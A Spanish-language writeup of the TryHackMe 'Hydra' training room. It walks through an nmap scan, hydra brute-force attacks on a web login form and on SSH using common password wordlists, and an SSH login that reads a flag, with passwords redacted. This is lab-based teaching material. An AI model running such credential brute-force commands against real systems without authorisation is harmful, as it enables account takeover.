---
title: Try Hack Me - Hydra - Writeup
date: 2022-09-20 09:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a resolver el room [Hydra](https://tryhackme.com/room/hydra) de [THM](https://tryhackme.com) creado por [cmnatic](https://tryhackme.com/p/cmnatic) en el que utilizaremos **hydra** como herramienta (no se podía saber).

Dentro música.

## Inicio

Para empezar, nos leemos con atención la descripción que acompaña la tarea 2 del room en la cual nos dan:

* las claves de los comandos que deberemos utilizar.
* el nombre de un usuario.

Iniciamos la máquina y enumeramos con **nmap**.

## Enumeración

En este caso, tiramos de la flag `-A`&nbsp; para hacer un escaneo completo.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
└─$ nmap -A 10.10.192.81 -oN nmap_output           
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 14:59 CEST
Nmap scan report for 10.10.192.81
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c2:e5:6c:35:f3:62:07:77:d7:af:37:b9:b2:c8:5e:22 (RSA)
|   256 ef:61:6c:5e:04:db:87:61:02:60:0e:9e:d5:06:9f:9c (ECDSA)
|_  256 56:7e:6b:54:4c:26:22:ec:f4:1c:23:ed:85:b6:b2:34 (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Hydra Challenge
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute)
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

El volcado de **nmap** nos cuenta que tenemos dos puertos abiertos:

* *22/tcp* con un servicio **ssh** escuchando.
* *80/tcp* con un servicio **http** escuchando.

## HTTP

Abrimos un navegador y cargamos la IP del room.

Nos aparece la página de login.

![](/assets/posts/20220920/img01.png)

OK. En una nueva ventana de terminal buscamos un diccionario para utilizar con **hydra** contando con que tenemos un nombre de usuario.

> **Tip:** Leeros el Hint de la primer pregunta. Yo no lo hice.

<br>

```console
┌──(ewan67㉿kali)-[~]
└─$ cd /usr/share/seclists/

┌──(ewan67㉿kali)-[/usr/share/seclists]
└─$ ls              
Discovery  Fuzzing  IOCs  Miscellaneous  Passwords  Pattern-Matching  Payloads  README.md  Usernames  Web-Shells

┌──(ewan67㉿kali)-[/usr/share/seclists]
└─$ cd Passwords           

┌──(ewan67㉿kali)-[/usr/share/seclists/Passwords]
└─$ ls -la
total 258624
drwxr-xr-x 12 root root    12288 Aug  3 08:19 .
drwxr-xr-x 11 root root     4096 Aug  3 08:19 ..
-rw-r--r--  1 root root     1621 Aug  2 11:51 2020-200_most_used_passwords.txt
[...]
```

Me quedo con el primero, *2020-200_most_used_passwords*&nbsp; suena suficiente para empezar.

Volvemos al terminal de la carpeta de trabajo y lanzamos **hydra**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
└─$ hydra -l molly -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 10.10.192.81 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 15:33:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-post-form://10.10.192.81:80/login:username=^USER^&password=^PASS^:F=incorrect
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "123456" - 1 of 200 [child 0] (0/0)
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "123456789" - 2 of 200 [child 1] (0/0)
[...]
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "12345678" - 5 of 200 [child 4] (0/0)
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "aaaaaa" - 59 of 200 [child 2] (0/0)
[80][http-post-form] host: 10.10.192.81   login: molly   password: <MODIFICADO>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 15:33:19
```

Volvemos al navegador, introducimos las credenciales y obtenemos la primer flag.

Vamos a por la segunda.

## SSH

Con la lección aprendida, cambiamos de diccionario y lanzamos el comando correspondiente al *ssh*.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.81 ssh -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 15:59:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.192.81:22/
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[...]
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "jordan" - 35 of 14344400 [child 4] (0/1)
[ATTEMPT] target 10.10.192.81 - login "molly" - pass "liverpool" - 36 of 14344400 [child 11] (0/1)
[22][ssh] host: 10.10.192.81   login: molly   password: <MODIFICADO>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 15:59:26
```

Tenemos la contraseña. Conectamos por *ssh*.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Hydra]
└─$ ssh molly@10.10.192.81
molly@10.10.192.81's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.

Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-192-81:~$ ls
flag2.txt
molly@ip-10-10-192-81:~$ cat flag2.txt 
THM{<MODIFICADO>}
molly@ip-10-10-192-81:~$ 
```

Segunda flag y final de show.

Espero que esta guía os haya resultado de ayuda.

Sed buenos si no hay una opción mejor.